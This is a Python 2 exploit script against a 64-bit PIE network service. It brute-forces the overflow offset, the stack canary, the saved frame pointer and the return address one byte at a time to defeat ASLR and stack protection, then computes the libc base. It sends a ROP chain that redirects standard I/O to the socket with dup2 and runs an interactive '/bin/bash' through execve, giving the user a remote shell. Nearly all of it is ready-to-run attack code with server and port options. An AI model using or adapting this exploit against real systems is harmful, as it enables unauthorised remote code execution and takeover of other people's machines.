#!/usr/bin/python

__author__ = "Rajesh Majumdar"

import struct
import os,sys
import socket
import random
import string
import telnetlib
import time
import base64
import getopt
from struct import pack

server = ''
port = ''

#################################### Start params ##############################
# Exploit configuration parameters.. Must be adjusted to the target system and app.
OFFSET_SAVED_EIP = 0x279 
PAGE_NUMBER_OF_NEXT_INSTRUCTION_TO_CALL = 1 # Note that is not zero for this example
OFFSET_TO_LIBC = 0x5e4000
#################################### End params ################################


def get_connection():
   s=socket.socket()
   s.connect((server,port))
   return s

def interact_shell(s):
   sys.stdout.flush()
   s.send("");
   time.sleep(0.2)
   sys.stdout.write(s.recv(4096))
   while True:
      try:
         sys.stdout.flush()
         c = sys.stdin.readline()
         s.send(c)
         time.sleep(0.5)
         sys.stdout.write(s.recv(4096))
      except KeyboardInterrupt, e:
         print " quit"
         s.close()
         break


def send2server(payload):
#   print "[Payload]\n[0x%s]\n" % payload.encode("hex")
   s = get_connection()
   s.send("Hi server")
   res = s.recv(1024)
   s.send(payload)
   return s.recv(1024)

#################### MAIN ####################

def usage():
   print 'exploit-server_64_PIE.py -s <server> -p <port>'
   sys.exit(2)

def main(argv):
   global server
   global port
   try:
      opts, args = getopt.getopt(argv,"hs:p:",["s=","p="])
      if len(sys.argv) == 1:
         usage()
   except getopt.GetoptError:
      usage()
   for opt, arg in opts:
      if opt == '-h':
         usage()
      elif opt in ("-s", "--server"):
         server = arg
      elif opt in ("-p", "--port"):
         port = int(arg)


if __name__ == "__main__":
   main(sys.argv[1:])


print "[+] Exploit ASLR 64 bit systems "
print "[+] Trying to find out the canary offset "

p = "\xff\xff\xff\xff\xff\xff\xff\xff"
while True:
   res = send2server(p)
   if res == "":
      break
   p += "\xff\xff\xff\xff\xff\xff\xff\xff"


# Remove last char
p = p[:-8]

print "   [+] Offset is %d bytes" % len(p)

print "[+] Brute forcing stack canary "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         #print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print "   [+] SSP value is 0x%s" % canary

#set a valid EBP ....
print "[+] Brute forcing EBP "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         #print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


ebp = p[stop:start-1:-1].encode("hex")
print "   [+] EBP value is 0x%s" % ebp



print "[+] Brute forcing Saved EIP "

# We know the first and half byte so ...
# Add the first byte to the payload
p += chr((OFFSET_SAVED_EIP & 0xff))

# We aslo know the first half of the second byte 
half_second_byte_eip = (OFFSET_SAVED_EIP >> 8)

for i in range(0,16):
   
   res = send2server( p + chr(half_second_byte_eip) )

   if res != "":
      p += chr(half_second_byte_eip)
      break

   half_second_byte_eip += 0x10


start = len(p)
stop = len(p)+6 # We only need find out 7 bytes


while len(p) < stop:
   for i in xrange(0,256):
      
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


eip = p[stop:start-3:-1].encode("hex")
print "   [+] EIP value is 0x%s" % eip

text_base = (int(eip, 16) &~ 0xfff) - (PAGE_NUMBER_OF_NEXT_INSTRUCTION_TO_CALL << 12)
print "[+] Text Base at 0x%016x" % text_base

libc_base = (int(text_base) - OFFSET_TO_LIBC)
print "[+] Libc Base at 0x%016x" % libc_base

# Remove last 8 bytes (Saved EIP)
p = p[:-8]

off = libc_base

# dup2 to the three standard I/O FD (STDIN, STDOUT, STDERR)
# dup2(4,0)
p += pack("<Q", off + 0x0000000000023d25) # pop rsi ; ret
p += pack("<Q", 0x0)
p += pack("<Q", off + 0x00000000000229f2) # pop rdi ; ret
p += pack("<Q", 0x4)
p += pack("<Q", off + 0x000e7050) # dup2()

# dup2(4,1)
p += pack("<Q", off + 0x0000000000023d25) # pop rsi ; ret
p += pack("<Q", 0x1)
p += pack("<Q", off + 0x00000000000229f2) # pop rdi ; ret
p += pack("<Q", 0x4)
p += pack("<Q", off + 0x000e7050) # dup2()

# dup2(4,2)
p += pack("<Q", off + 0x0000000000023d25) # pop rsi ; ret
p += pack("<Q", 0x2)
p += pack("<Q", off + 0x00000000000229f2) # pop rdi ; ret
p += pack("<Q", 0x4)
p += pack("<Q", off + 0x000e7050) # dup2()


# ./ROPgadget /lib/x86_64-linux-gnu/libc.so.6 "/bin/bash" -- "-i"
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b9880) # @ .data
p += pack("<Q", off + 0x0000000000023950) # pop rax ; ret
p += "/bin/bas" # /bin/bas
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b9888) # @ .data + 8
p += pack("<Q", off + 0x0000000000023950) # pop rax ; ret
p += "hAAAAAAA" # hAAAAAAA
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b9889) # @ .data + 9
p += pack("<Q", off + 0x000000000008b52f) # xor rax,rax ; ret
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b988a) # @ .data + 10
p += pack("<Q", off + 0x0000000000023950) # pop rax ; ret
p += "-iAAAAAA" # -iAAAAAA
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b988c) # @ .data + 12
p += pack("<Q", off + 0x000000000008b52f) # xor rax,rax ; ret
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b988d) # @ .data + 13
p += pack("<Q", off + 0x0000000000023950) # pop rax ; ret
p += pack("<Q", off + 0x00000000003b9880) # @ .data
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b9895) # @ .data + 21
p += pack("<Q", off + 0x0000000000023950) # pop rax ; ret
p += pack("<Q", off + 0x00000000003b988a) # @ .data + 10
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b989d) # @ .data + 29
p += pack("<Q", off + 0x000000000008b52f) # xor rax,rax ; ret
p += pack("<Q", off + 0x000000000007ce9b) # mov QWORD PTR [rdx],rax ; ret
p += pack("<Q", off + 0x00000000000229f2) # pop rdi ; ret
p += pack("<Q", off + 0x00000000003b9880) # @ .data
p += pack("<Q", off + 0x0000000000023d25) # pop rsi ; ret
p += pack("<Q", off + 0x00000000003b988d) # @ .data + 13
p += pack("<Q", off + 0x0000000000001b8a) # pop rdx ; ret
p += pack("<Q", off + 0x00000000003b989d) # @ .data + 29
p += pack("<Q", off + 0x0000000000023950) # pop rax ; ret
p += pack("<Q", 0x000000000000003b) #  execve
p += pack("<Q", off + 0x0000000000001454) # syscall


print "[+] Getting shell ..."

s = get_connection();
s.send("Exploit by punxos"); # send some bytes
res = s.recv(256); # read banner
s.send(p); # send payload

interact_shell(s);




